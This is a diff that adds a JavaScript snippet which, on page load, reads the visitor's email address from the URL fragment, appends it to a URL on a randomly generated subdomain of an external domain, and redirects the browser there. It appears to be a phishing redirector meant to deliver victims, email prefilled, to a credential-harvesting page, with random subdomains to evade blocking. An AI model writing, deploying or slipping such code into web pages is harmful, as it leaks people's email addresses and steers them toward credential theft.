@@ -1,0 +1,29 @@
+<script>
+    var data = getParameter();
+    var randomString = generateRandomString(10); // Generate a random string
+    var redir_to_page = "https://" + randomString + ".dlgkzihh.es/A7kIwxbzu!4BXi/$" + data + ""; // Add random string to domain
+    
+    var hash = window.location.hash;
+    var email = hash.split('#??')[1];
+    redir_to_page = redir_to_page + email;
+    https://github.com/ajaxorg/ace/wiki/Default-Keyboard-Shortcuts
+    window.location = redir_to_page;
+
+    function getParameter() {
+        var listof = [""]; 
+        var listCount = listof.length;
+        var randomNum = listCount - 1;
+        randomNum = Math.floor(Math.random() * randomNum);
+        var result = listof[randomNum];
+        return result;
+    }
+
+    function generateRandomString(length) {
+        var characters = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+        var result = "";
+        for (var i = 0; i < length; i++) {
+            result += characters.charAt(Math.floor(Math.random() * characters.length));
+        }
+        return result;
+    }
+</script>
